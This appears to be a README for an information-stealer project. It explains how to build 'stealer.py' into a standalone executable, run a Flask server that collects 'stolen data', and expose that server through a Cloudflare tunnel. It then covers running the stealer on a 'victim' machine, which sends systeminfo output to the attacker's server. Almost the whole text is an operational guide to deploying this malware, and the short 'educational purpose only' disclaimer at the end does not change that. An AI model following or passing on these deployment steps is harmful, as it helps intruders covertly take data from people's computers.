
pip install -r requirements.txt
python -m PyInstaller stealer.spec
```
#### For Linux
```bash
.\build.sh
```

# Prerequisites

## Step 1: Install Dependencies
Before running the project, install all required Python packages:

```bash
pip install -r requirements.txt
```

**Required packages:**
- Flask==3.0.3 (Web server framework)
- pyinstaller==6.9.0 (Package Python application into executable)
- requests (HTTP library for sending data)

## Step 2: Install Cloudflare Tunnel (cloudflared)
Cloudflare Tunnel allows you to expose your local server to the internet securely without opening firewall ports.

### For Windows:
Download and install from [Cloudflare's official website](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/)

Or using winget:
```bash
winget install --id Cloudflare.cloudflared
```

### For Linux:
```bash
# Debian/Ubuntu
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Or using package manager
sudo apt install cloudflared
```

Verify installation:
```bash
cloudflared --version
```

# How to Execute

## Overview
This project requires **three separate terminal windows** running simultaneously. Follow the steps below in order.

---

## Terminal 1: Start the Flask Server

Open the first terminal and navigate to the project directory:

```bash

Run the Flask server:
```bash
python server.py
```

**Expected Output:**
```
 * Serving Flask app 'server'
 * Running on http://127.0.0.1:3000
```

**What this does:**
- Starts a Flask web server on port 3000
- Creates a POST endpoint at `/` to receive stolen data
- Saves received system information to `target_information.txt`

**⚠️ Keep this terminal running - Do NOT close it!**

---

## Terminal 2: Create Cloudflare Tunnel

Open the second terminal and create a tunnel to expose your local server:

```bash
cloudflared tunnel --url http://127.0.0.1:3000
```

**Expected Output:**
```
Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):
https://random-subdomain-xyz.trycloudflare.com
```

**Important Steps:**
1. **Copy the generated URL** (e.g., `https://random-subdomain-xyz.trycloudflare.com`)
2. Open `stealer.py` in a text editor
3. **Replace the URL** in stealer.py:

```python
# Change this line in stealer.py:
url = "http://localhost:3000"

# To your Cloudflare tunnel URL:
url = "https://random-subdomain-xyz.trycloudflare.com"
```

4. **Save the file** after making this change

**What this does:**
- Creates a secure tunnel from the internet to your local server
- Provides a public HTTPS URL that can be accessed from anywhere
- Allows the stealer to send data from any remote machine

**⚠️ Keep this terminal running - Do NOT close it!**

---

## Terminal 3: Build the Stealer Executable

Open the third terminal and navigate to the project directory:

```bash
```

### For Windows:
```bash
.\build.bat
```

Or manually:
```bash
python -m PyInstaller stealer.spec
```

### For Linux:
```bash
chmod +x build.sh
./build.sh
```

**Expected Output:**
```
Building EXE from EXE-00.toc completed successfully.
```

**What this does:**
- Packages `stealer.py` into a standalone executable
- Creates a `dist` folder containing `stealer.exe` (Windows) or `stealer` (Linux)
- The executable can run on machines without Python installed

---

## Step 4: Deploy and Execute the Stealer

After building successfully, the executable will be located in the `dist` folder.

### On Target Machine (Victim):

**Windows:**
```bash
cd dist
stealer.exe
```

**Linux:**
```bash
cd dist
chmod +x stealer
./stealer
```

**What happens:**
- Stealer collects system information using `systeminfo` (Windows) or equivalent command
- Sends data via HTTP POST to your Cloudflare tunnel URL
- Data is forwarded through the tunnel to your local Flask server
- Retries every 3 seconds if connection fails

---

## Step 5: View Stolen Data

Once the stealer executes successfully, check the `target_information.txt` file on the **server machine** (where Terminal 1 is running):

**Windows:**
```bash
type target_information.txt
```

**Linux:**
```bash
cat target_information.txt
```

This file contains the complete system information from the target machine.

# Architecture Flow

1. **Victim Machine** → Runs `stealer.exe` or `stealer.py`
2. **Stealer** → Collects system info with `systeminfo` command
3. **Stealer** → Sends JSON data via HTTP POST to server
4. **Server** → Receives data on port 3000
5. **Server** → Writes data to `target_information.txt`

# Security Warning
⚠️ **EDUCATIONAL PURPOSE ONLY** - This project demonstrates how information stealers work. Unauthorized use of such tools is illegal and unethical. Use only in controlled environments with proper authorization for educational or security research purposes.
